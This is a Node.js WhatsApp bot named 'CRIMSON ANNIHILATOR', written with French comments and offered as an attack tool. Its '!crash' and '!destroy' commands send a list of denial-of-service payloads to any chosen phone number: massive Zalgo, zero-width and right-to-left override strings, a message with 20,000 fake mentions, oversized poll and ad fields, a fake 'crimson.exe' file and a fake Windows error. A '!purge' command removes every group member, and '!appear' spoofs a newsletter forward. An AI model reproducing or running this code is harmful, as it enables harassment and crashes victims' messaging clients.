const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, Browsers } = require('@whiskeysockets/baileys');
const pino = require('pino');
const qrcode = require('qrcode-terminal');

const PREFIX = '!';
const CRIMSON_IMAGE = 'https://chatgpt.com/s/m_6a4acb102fe481918aa736168207d457';
const CHANNEL_LINK = 'https://whatsapp.com/channel/0029Vb7VJKA2P591KNZnBz1G';
const GROUP_LINK = 'https://chat.whatsapp.com/CIQQN32Gu825CVzI5BIWMs';

const MENU = `🩸 *CRIMSON ANNIHILATOR* 🩸
⚡ *Commandes :*
!help – Menu avec l'image
!crash [numéro] – 20 crashes visuels
!purge – Expulse tous les membres (admin)
!kick @membre – Expulse un membre (admin)
!warn @membre – Avertit un membre
!tagall – Mentionne tout le monde
!appear – Apparaît comme une chaîne CRIMSON
!destroy [numéro] – Bugs destructeurs
!invite – Envoie les liens chaîne/groupe`;

// 20 payloads ultra-violents
const crashes = [
    'Z̷̴̵̶̷̸̢̡̨̡̢̧̨̛̛̗̘̙̜̝̞̟̠̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼͇͈͉͍͎̽̾̿̀́͂̓̈́͆͊͋͌ͅ͏͓͔͕͖͙͚͐͑͒͗͛͘͜͟͢͝͞͠͡'.repeat(200),
    '\u200B'.repeat(10000) + '🩸 CRIMSON 🩸' + '\u200B'.repeat(10000),
    '\u202E' + 'Z̷̴̵̶̷̸̢̡̨̡̢̧̨̛̛̗̘̙̜̝̞̟̠̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́'.repeat(100) + '\u202E',
    { image: { url: CRIMSON_IMAGE }, caption: '\u200B'.repeat(5000) + '💀 ANNIHILATION 💀' + '\u200B'.repeat(5000) },
    '\u200D'.repeat(5000) + '⛓️ TU ES DÉTRUIT ⛓️' + '\u200D'.repeat(5000),
    '█'.repeat(20000),
    async (sock, target) => {
        const mentionedJids = Array.from({ length: 20000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
        await sock.sendMessage(target, { text: '📤 Statut partagé', mentions: mentionedJids, contextInfo: { isForwarded: true, forwardingScore: 999, mentionedJid: mentionedJids } });
    },
    '\uD83D\uDE00\uFE0E\u200D\uD83D\uDE00\uFE0E'.repeat(1000),
    '\u200D'.repeat(20000),
    async (sock, target) => {
        await sock.sendMessage(target, { text: '⚠️ Alerte Système', contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply: { title: '⚠️'.repeat(10000), body: '🚨'.repeat(20000), thumbnailUrl: CRIMSON_IMAGE } } });
    },
    async (sock, target) => {
        await sock.sendMessage(target, { poll: { name: '\u200B'.repeat(2000) + '💀 SONDAGE CRIMSON 💀' + '\u200B'.repeat(2000), options: ['Z̷̴̵̶̷̸̢̡̨̡̢̧̨̛̛̗̘̙̜̝̞̟̠̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́'.repeat(300), '\u202E' + 'OPTION INVERSEE' + '\u202E', '\u200B'.repeat(5000) + 'OPTION FANTÔME'] } });
    },
    `🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
🟦                                                    🟦
🟦   Windows Error 0xDEADBEEF                         🟦
🟦   SYSTEM FAILURE - CONTACT ADMINISTRATOR            🟦
🟦                                                    🟦
🟦   ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛   97%
🟦                                                    🟦
🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦`,
    async (sock, target) => {
        await sock.sendMessage(target, { audio: { url: 'https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true' }, mimetype: 'audio/mpeg', ptt: true });
    },
    async (sock, target) => {
        await sock.sendMessage(target, { document: { url: 'https://i.imgur.com/placeholder.png' }, mimetype: 'application/octet-stream', fileName: 'crimson.exe' });
    },
    async (sock, target) => {
        await sock.sendMessage(target, { sticker: { url: 'https://i.imgur.com/placeholder.png' } });
    }
];

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_crimson');
    const { version } = await fetchLatestBaileysVersion();
    console.log('🔌 CRIMSON ANNIHILATOR');
    console.log('Connexion WhatsApp v' + version.join('.'));

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'info' }),
        browser: Browsers.ubuntu('Chrome'),
        connectTimeoutMs: 60_000
    });

    // QR code (fiable) + pairing code en fallback
    sock.ev.on('connection.update', (update) => {
        const { connection, qr, lastDisconnect } = update;
        if (qr) {
            console.log('\n📱 QR CODE :\n');
            qrcode.generate(qr, { small: true });
            console.log('👉 Scanne ce QR avec WhatsApp (Appareils liés).\n');
        }
        if (connection === 'open') {
            console.log('✅ CRIMSON ANNIHILATOR connecté !');
        }
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('Reconnexion...');
                startBot();
            }
        }
    });

    // Pairing code si pas encore enregistré (fallback)
    if (!sock.authState.creds.registered) {
        // Petite pause pour laisser le QR s'afficher d'abord
        setTimeout(async () => {
            if (!sock.authState.creds.registered) {
                const readline = require('readline');
                const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
                const phone = await new Promise(resolve => rl.question('Ton numéro WhatsApp (ex: 241077335574) : ', answer => { rl.close(); resolve(answer.trim()); }));
                console.log('🔑 Génération du code d\'appairage...');
                try {
                    const code = await sock.requestPairingCode(phone);
                    console.log(`\n📲 CODE : ${code}`);
                    console.log('👉 WhatsApp > Appareils liés > Lier avec un code.\n');
                } catch (err) { console.error('Erreur pairing code:', err.message); }
            }
        }, 10000); // 10 secondes pour laisser le QR s'afficher
    }

    sock.ev.on('creds.update', saveCreds);

    // Écoute des messages
    sock.ev.on('messages.upsert', async (m) => {
        const msg = m.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const fromJid = msg.key.remoteJid;
        const isGroup = fromJid.endsWith('@g.us');
        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '';
        if (!body.startsWith(PREFIX)) return;
        const args = body.slice(PREFIX.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        if (command === 'help' || command === 'menu') {
            await sock.sendMessage(fromJid, { image: { url: CRIMSON_IMAGE }, caption: MENU });
            return;
        }

        if (command === 'invite') {
            await sock.sendMessage(fromJid, { text: `🔗 Rejoins la chaîne CRIMSON : ${CHANNEL_LINK}\n\n💬 Rejoins le groupe : ${GROUP_LINK}` });
            return;
        }

        if (command === 'crash' || command === 'destroy') {
            const target = args[0] ? (args[0].includes('@s.whatsapp.net') ? args[0] : args[0] + '@s.whatsapp.net') : fromJid;
            await sock.sendMessage(fromJid, { text: '🔥 Envoi des crashes...' });
            for (const payload of crashes) {
                try {
                    if (typeof payload === 'function') await payload(sock, target);
                    else if (typeof payload === 'string') await sock.sendMessage(target, { text: payload });
                    else await sock.sendMessage(target, payload);
                } catch (e) {}
                await new Promise(r => setTimeout(r, 1000));
            }
            await sock.sendMessage(fromJid, { text: '⚡ Crashes envoyés.' });
            return;
        }

        if (!isGroup) return;
        const metadata = await sock.groupMetadata(fromJid);
        const senderJid = msg.key.participant || msg.key.remoteJid;
        const isSenderAdmin = metadata.participants.find(p => p.id === senderJid)?.admin;

        if (command === 'warn') {
            const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
            if (mentioned.length === 0) return sock.sendMessage(fromJid, { text: '❌ Mentionne la cible : !warn @membre' });
            await sock.sendMessage(fromJid, { text: `⚠️ *AVERTISSEMENT DE CRIMSON*\n@${mentioned[0].split('@')[0]} a été signalé.`, mentions: mentioned });
            return;
        }

        if (command === 'purge' || command === 'kick' || command === 'tagall') {
            if (!isSenderAdmin) return sock.sendMessage(fromJid, { text: '❌ Admin requis.' });
            if (command === 'purge') {
                const toRemove = metadata.participants.filter(p => p.id !== sock.user.id && p.id !== senderJid);
                for (const p of toRemove) {
                    try { await sock.groupParticipantsUpdate(fromJid, [p.id], 'remove'); } catch (e) {}
                    await new Promise(r => setTimeout(r, 800));
                }
                await sock.sendMessage(fromJid, { text: '✅ *Silence.* La Purge est terminée.' });
            } else if (command === 'kick') {
                const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (mentioned.length === 0) return sock.sendMessage(fromJid, { text: '❌ Mentionne la cible : !kick @membre' });
                try { await sock.groupParticipantsUpdate(fromJid, mentioned, 'remove'); } catch (e) {}
                await sock.sendMessage(fromJid, { text: '👢 Membre expulsé.' });
            } else if (command === 'tagall') {
                const text = args.join(' ') || '📢 Rassemblement !';
                let mentions = [], mentionText = text + '\n\n';
                for (const p of metadata.participants) {
                    if (p.id !== sock.user.id) { mentions.push(p.id); mentionText += '@' + p.id.split('@')[0] + ' '; }
                }
                await sock.sendMessage(fromJid, { text: mentionText, mentions });
            }
        }

        if (command === 'appear') {
            await sock.sendMessage(fromJid, {
                video: { url: 'https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true' },
                mimetype: 'video/mp4',
                caption: '🔥 Intervention de CRIMSON',
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363047752422936@newsletter',
                        newsletterName: 'CRIMSON OFFICIAL',
                        serverMessageId: Math.floor(Math.random() * 1000000),
                        contentType: 'video',
                        accessibilityText: 'Intervention CRIMSON',
                        thumbnailUrl: CRIMSON_IMAGE
                    }
                }
            });
        }
    });
}

startBot();
